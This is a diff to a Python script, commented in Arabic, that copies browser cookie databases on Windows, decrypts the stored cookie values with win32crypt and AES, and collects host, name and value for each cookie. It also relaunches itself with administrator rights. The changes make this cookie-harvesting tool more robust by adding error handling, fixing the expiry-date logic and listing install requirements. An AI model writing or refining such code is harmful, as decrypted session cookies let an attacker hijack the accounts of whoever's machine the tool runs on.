@@ -5,14 +5,19 @@ import sqlite3
 import json
 import base64
 import ctypes
-from datetime import datetime
+from datetime import datetime, timedelta
 
-# --- مكتبات مطلوبة يجب تثبيتها ---
-from rich.console import Console
-from rich.panel import Panel
-from rich.progress import Progress
-from Crypto.Cipher import AES
-import win32crypt # يتطلب pypiwin32
+# --- مكتبات مطلوبة (سيتم تثبيتها عبر requirements.txt) ---
+try:
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.progress import Progress
+    from Crypto.Cipher import AES
+    import win32crypt
+except ImportError:
+    print("Error: One or more required libraries are not installed.")
+    print("Please run: pip install rich pypiwin32 pycryptodomex")
+    sys.exit(1)
 
 # ==============================================================================
 # الإعدادات الرئيسية
@@ -86,8 +91,13 @@ def extract_cookies(browser_name, browser_path, progress, task_id):
         return []
 
     # نسخ ملف الكوكيز لتجنب قفل قاعدة البيانات
-    temp_db_path = os.path.join(os.getenv('TEMP'), f'cookies_db_{browser_name}.db')
-    shutil.copy2(cookies_db_path, temp_db_path)
+    temp_db_path = os.path.join(os.getenv('TEMP', os.getcwd()), f'cookies_db_{browser_name}.db')
+    try:
+        shutil.copy2(cookies_db_path, temp_db_path)
+    except Exception:
+        progress.update(task_id, description=f"[red]فشل نسخ ملفات [bold]{browser_name}[/bold].", advance=100)
+        return []
+        
     progress.update(task_id, advance=30)
 
     all_cookies = []
@@ -99,13 +109,17 @@ def extract_cookies(browser_name, browser_path, progress, task_id):
         for host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly in cursor.fetchall():
             decrypted_value = decrypt_data(encrypted_value, master_key)
             if decrypted_value != "Decryption Failed":
+                expiry_date = "Session"
+                if expires_utc != 0:
+                    expiry_date = str(datetime(1601, 1, 1) + timedelta(microseconds=expires_utc))
+
                 all_cookies.append({
                     'browser': browser_name,
                     'host': host_key,
                     'name': name,
                     'value': decrypted_value,
                     'path': path,
-                    'expires_utc': str(datetime(1601, 1, 1) + datetime.timedelta(microseconds=expires_utc)),
+                    'expires_utc': expiry_date,
                     'is_secure': bool(is_secure),
                     'is_httponly': bool(is_httponly),
                 })
@@ -115,7 +129,9 @@ def extract_cookies(browser_name, browser_path, progress, task_id):
         os.remove(temp_db_path) # حذف الملف المؤقت
 
     except Exception as e:
-        progress.update(task_id, description=f"[red]خطأ في قراءة ملفات [bold]{browser_name}[/bold]: {e}", advance=100)
+        progress.update(task_id, description=f"[red]خطأ في قراءة ملفات [bold]{browser_name}[/bold].", advance=100)
+        if os.path.exists(temp_db_path):
+            os.remove(temp_db_path)
         return []
         
     progress.update(task_id, description=f"[green]تم العثور على {total_cookies_found} كوكي من [bold]{browser_name}[/bold].", advance=70)
@@ -136,7 +152,10 @@ def main():
     if not is_admin():
         console.print("[bold red]خطأ: صلاحيات المسؤول مطلوبة للوصول إلى ملفات المتصفحات.[/bold]")
         console.print("[yellow]سيتم محاولة إعادة تشغيل البرنامج بصلاحيات المسؤول...[/yellow]")
-        run_as_admin()
+        try:
+            run_as_admin()
+        except Exception:
+            console.print("[bold red]فشلت إعادة التشغيل. يرجى تشغيل البرنامج كمسؤول يدويًا.[/bold]")
         sys.exit()
 
     final_results = []
